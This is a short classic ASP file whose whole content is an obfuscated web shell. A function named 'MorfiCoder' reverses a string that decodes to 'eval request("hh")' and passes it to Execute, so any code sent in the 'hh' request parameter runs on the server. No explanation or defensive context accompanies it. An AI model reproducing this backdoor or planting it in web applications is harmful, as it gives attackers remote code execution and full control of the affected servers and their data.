<%
Function MorfiCoder(Code)
MorfiCoder=Replace(Replace(StrReverse(Code),"/*/",""""),"\*\",vbCrlf)
End Function
Execute MorfiCoder(")/*/hh/*/(tseuqer lave")
%>